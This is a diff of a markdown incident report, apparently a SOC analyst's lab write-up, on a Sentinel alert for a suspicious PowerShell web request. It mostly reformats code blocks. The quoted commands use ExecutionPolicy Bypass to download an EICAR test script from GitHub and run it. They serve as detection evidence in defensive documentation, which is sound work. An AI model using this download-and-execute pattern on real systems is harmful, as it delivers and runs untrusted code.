@@ -383,9 +383,7 @@ powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
 
 Incident assigned to SOC Analyst (Myself).
 Followed NIST SP 800-61 Incident Response Lifecycle.
-All findings documented inside Sentinel incident notes.
 
-<img width="1195" height="1198" alt="image" src="https://github.com/user-attachments/assets/3e412fd4-285c-4ba4-8ab4-5034d6aae5ba" />
 
 ### Detection and Analysis
 - The incident, labeled “PowerShell Suspicious Web Request”, was triggered on lamavmonboardin by a single user.
@@ -393,10 +391,14 @@ All findings documented inside Sentinel incident notes.
 
 #### PowerShell Commands Executed:
 1.
-``` powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../eicar.ps1 -OutFile C:\programdata\eicar.ps1 ```
+```
+powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../eicar.ps1 -OutFile C:\programdata\eicar.ps1
+```
 
-2.
-``` powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1 ```
+3.
+```
+powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1
+```
 
 ##### Incident Details
 
